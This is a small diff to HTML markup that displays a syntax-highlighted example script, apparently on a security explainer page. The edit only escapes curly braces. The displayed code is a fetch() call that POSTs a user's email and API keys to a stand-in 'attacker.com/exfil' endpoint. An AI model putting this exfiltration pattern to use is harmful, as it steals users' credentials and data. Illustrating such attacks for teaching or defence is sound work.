@@ -165,7 +165,7 @@
     <span class="text-zinc-500 italic">// Exfiltrate sensitive data to attacker server</span>
     <span class="text-blue-400">fetch</span>(<span class="text-orange-300">'https://attacker.com/exfil'</span>, &#123;
       <span class="text-purple-400">method</span>: <span class="text-orange-300">'POST'</span>,
-      <span class="text-purple-400">body</span>: JSON.<span class="text-blue-400">stringify</span>({ email: data.email, keys: data.api_keys })
+      <span class="text-purple-400">body</span>: JSON.<span class="text-blue-400">stringify</span>(&#123; email: data.email, keys: data.api_keys &#125;)
     &#125;);
   &#125;);
 &lt;/<span class="text-pink-400">script</span>&gt;</pre>
